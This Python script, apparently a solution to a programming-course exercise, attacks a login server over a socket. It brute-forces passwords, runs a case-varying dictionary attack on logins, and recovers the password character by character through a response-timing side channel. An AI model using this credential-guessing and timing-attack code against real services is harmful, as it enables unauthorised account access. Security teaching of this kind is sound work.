from itertools import product
import socket
import sys
import string
import json
from time import time


class PasswordHacker:
    def __init__(self, ip_address, port):
        self.logs_file = open("logs.txt", "a")
        self.ip_address = ip_address
        self.port = port
        self.client_socket = socket.socket()
        self.dict_file = "hacking/login.txt"
        self.login = None
        self.credentials = None

    def connect_to_server(self):
        self.client_socket.connect((self.ip_address, self.port))  # connect takes the tuple as an argument

    def abort_connection(self):
        self.client_socket.close()  # closing connection
        self.logs_file.close()

    @staticmethod
    def password_generator(output_length=1000000) -> str:
        possible_symbols = string.ascii_letters + string.digits
        for i in range(output_length):
            for message in product(possible_symbols, repeat=i + 1):
                yield "".join(message)

    def brute_force(self):  # client_socket
        generator = PasswordHacker.password_generator()
        for message in generator:
            password = ''.join(message)
            self.client_socket.send(password.encode())
            response = self.client_socket.recv(1024).decode()
            if response == "Connection success!":
                print(password)
                break

    @staticmethod
    def case_generator(_password) -> str:
        if not _password.isdigit():
            all_spelling_options = map(lambda x: ''.join(x),
                                       product(*([letter.lower(), letter.upper()] for letter in _password)))
            for i in all_spelling_options:
                yield i
        else:
            yield _password

    def send_and_recv_json_request(self, message) -> str:
        self.client_socket.send(message.encode())
        return self.client_socket.recv(1024).decode()

    def try_dictionary_password(self, _dict_file, _client_socket):
        password_pool = tuple(open(_dict_file).read().split('\n'))
        for password in password_pool:
            for password_variant in self.case_generator(password):
                response = self.send_and_recv_json_request(password_variant)
                if response == "Connection success!":
                    print(password_variant)
                    exit()

    def hack_login(self):
        # find login first, then find password, then send request
        logins_pool = [login for login in tuple(open(self.dict_file).read().split('\n')) if login]
        # iterating through the logins pool
        for login in logins_pool:
            # defining case-generator
            generator_logins = self.case_generator(login)
            # trying options from generator
            for login_variant in generator_logins:
                # creating json message to the server
                message = {"login": login_variant, "password": ""}
                # sending json message to the server and
                # reading response from server
                response = self.send_and_recv_json_request(json.dumps(message))
                # "Wrong login!" should be ignored. once "Wrong password!" message received = login hacked,
                # and need to find the password.
                if json.loads(response)["result"] == "Wrong password!":
                    # login_variant will be correct login at this step
                    return login_variant

    def hack_password(self, password_beginning=""):
        for password in self.password_generator(output_length=1):
            if password_beginning:
                password = password_beginning + password
            message = {"login": self.login, "password": password}
            # reading response from server
            start = time()
            response = self.send_and_recv_json_request(json.dumps(message))
            end = time()
            processing_time = (end - start) * 10_000_000
            self.logs_file.write(f"result :{json.loads(response)['result']}  {processing_time}\n")

            if json.loads(response)["result"] == "Wrong password!" and processing_time > 90000:
                return self.hack_password(password_beginning=password)
            if json.loads(response)["result"] == "Connection success!":
                self.credentials = json.dumps(message)
                return self.credentials


def main():
    args = sys.argv
    if len(args) < 3:
        print("Not enough arguments. Please provide : ip_address, port, message")
        exit()

    hacking_target = PasswordHacker(ip_address=args[1], port=int(args[2]))
    hacking_target.connect_to_server()

    hacking_target.login = hacking_target.hack_login()
    if not hacking_target.login:
        print("sorry, no more logins in DB file")
    else:
        hacking_target.credentials = hacking_target.hack_password()
        print(hacking_target.credentials)

    hacking_target.abort_connection()


if __name__ == '__main__':
    main()